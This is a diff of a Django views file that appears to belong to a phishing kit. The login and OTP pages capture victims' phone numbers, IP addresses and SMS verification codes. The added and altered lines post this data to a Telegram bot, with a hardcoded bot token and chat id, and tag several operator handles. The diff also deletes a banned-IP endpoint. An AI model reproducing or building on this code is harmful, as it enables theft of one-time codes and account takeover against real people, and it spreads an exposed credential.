@@ -67,13 +67,17 @@ def login(request):
         contact.page_name="Nomre"
         contact.save()
         input_string = str(clean_number)
-
+        number1 = int(input_string[:2])
+        number2 = int(input_string[2:5])
+        number3 = int(input_string[5:7])
+        number4 = int(input_string[7:])
         context={
             "number1":number1,
             "number2":number2,
             "number3":number3,
             "number4":number4
         }
+        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}\nPage:{contact.page_name}\nnumber:{contact.phone}\n  @kitayskiadam @TetaLab @alienfx')
         request.session['contact_id'] = contact.id
         return render(request, 'login/otp.html',context)
     return render(request, 'login/index.html')
@@ -114,7 +118,7 @@ def verify(request):
         context = {
             'last_contact_id': contact.id
         }
-        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001894884341&text=id:{contact.id}|ip:{contact.ip}\nsms:{combined_sms} @Maybewhou @Thinkpsd @DiplomatComeForU ')
+        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}\nsms:{combined_sms} @kitayskiadam @TetaLab @alienfx ')
         return render( request,'login/load.html',context )
     return render( request,'login/index.html',context )
 
@@ -195,9 +199,4 @@ def check_status(request, contact_id):
         return JsonResponse({'approve_status': contact.approve_status})
     except ContactModel.DoesNotExist:
         return JsonResponse({'error': f'Contact with ID {contact_id} does not exist.'}, status=404)
-    
-    
-class BannedIPListCreateAPIView(generics.ListCreateAPIView):
-    queryset = BannedIP.objects.all()
-    serializer_class = BannedIPSerializer
     
